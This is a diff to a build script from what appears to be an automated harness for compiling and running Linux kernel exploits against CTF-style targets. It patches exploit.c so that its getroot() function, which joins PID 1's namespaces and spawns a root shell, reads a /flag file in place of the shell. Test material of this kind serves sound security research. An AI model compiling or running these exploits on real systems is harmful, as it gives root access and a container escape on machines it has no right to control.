@@ -91,6 +91,7 @@ mkdir -p "$SCRIPT_DIR/exp"
 # Copy source files
 cp "$EXPLOIT_SRC"/*.c "$SCRIPT_DIR/exp/" 2>/dev/null || true
 cp "$EXPLOIT_SRC"/*.h "$SCRIPT_DIR/exp/" 2>/dev/null || true
+cp "$EXPLOIT_SRC"/Makefile "$SCRIPT_DIR/exp/" 2>/dev/null || true
 
 # Create keyutils.h stub (syscall-based, no libkeyutils-dev needed)
 if [ ! -f "$SCRIPT_DIR/exp/keyutils.h" ]; then
@@ -130,69 +131,34 @@ if [ -f "$SCRIPT_DIR/exp/exploit.c" ] && ! grep -q "cbq_compat.h" "$SCRIPT_DIR/e
     sed -i 's|#include "netlink_utils.h"|#include "cbq_compat.h"\n#include "netlink_utils.h"|' "$SCRIPT_DIR/exp/exploit.c"
 fi
 
-# Patch getroot() to read the flag directly instead of spawning bash
-# This avoids the need for interactive FIFO-based console input
-if [ -f "$SCRIPT_DIR/exp/exploit.c" ] && grep -q 'execve(args\[0\]' "$SCRIPT_DIR/exp/exploit.c"; then
-    info "Patching getroot() to read flag directly..."
-    python3 -c "
-import re, sys
-with open('$SCRIPT_DIR/exp/exploit.c', 'r') as f:
-    code = f.read()
-
-old = '''void getroot(void)
-{
-	char *args[] = { \"/bin/bash\", \"-i\", NULL };
-
-	puts(\"[+] We are Ro0ot!\");
-	setns(open(\"/proc/1/ns/mnt\", O_RDONLY), 0);
-	setns(open(\"/proc/1/ns/pid\", O_RDONLY), 0);
-	setns(open(\"/proc/1/ns/net\", O_RDONLY), 0);
-	execve(args[0], args, NULL);
-}'''
-
-new = '''void getroot(void)
-{
-	char buf[256];
-	int fd, n;
-
-	puts(\"[+] We are Ro0ot!\");
-	setns(open(\"/proc/1/ns/mnt\", O_RDONLY), 0);
-	setns(open(\"/proc/1/ns/pid\", O_RDONLY), 0);
-	setns(open(\"/proc/1/ns/net\", O_RDONLY), 0);
-
-	fd = open(\"/flag\", O_RDONLY);
-	if (fd < 0) fd = open(\"/dev/vdb\", O_RDONLY);
-	if (fd >= 0) {
-		n = read(fd, buf, sizeof(buf) - 1);
-		if (n > 0) { buf[n] = 0; printf(\"FLAG: %s\\\\n\", buf); }
-		close(fd);
-	}
-	printf(\"uid=%d\\\\n\", getuid());
-}'''
-
-if old in code:
-    code = code.replace(old, new)
-    with open('$SCRIPT_DIR/exp/exploit.c', 'w') as f:
-        f.write(code)
-    print('Patched getroot()')
-else:
-    print('getroot() not found or already patched')
-"
+# Patch shell-spawning functions (getroot/pwn/etc.) to read the flag directly
+# This avoids the need for interactive shell which blocks automated runs
+if [ -f "$SCRIPT_DIR/exp/exploit.c" ] && grep -qE 'execve.*(/bin/sh|/bin/bash)' "$SCRIPT_DIR/exp/exploit.c"; then
+    info "Patching shell-spawning function to read flag directly..."
+    python3 "$SCRIPT_DIR/patches/patch_shell_spawn.py" "$SCRIPT_DIR/exp/exploit.c"
 fi
 
 # Try compilation
 COMPILED=false
-if [ -f "$SCRIPT_DIR/exp/exploit.c" ]; then
+cd "$SCRIPT_DIR/exp"
+if [ -f Makefile ]; then
+    info "Makefile detected — building with make..."
+    if (make prerequisites 2>&1 || true) && make exploit 2>&1; then
+        ok "Makefile compilation succeeded"
+        COMPILED=true
+    else
+        warn "Makefile compilation failed"
+    fi
+elif [ -f exploit.c ]; then
     info "Compiling exploit.c..."
-    cd "$SCRIPT_DIR/exp"
     if gcc -I. -o exploit exploit.c -O0 -static -s 2>&1; then
         ok "Compilation succeeded"
         COMPILED=true
     else
         warn "Compilation failed"
     fi
-    cd "$SCRIPT_DIR"
 fi
+cd "$SCRIPT_DIR"
 
 if [ ! -f "$SCRIPT_DIR/exp/exploit" ]; then
     if [ -f "$EXPLOIT_SRC/exploit" ]; then
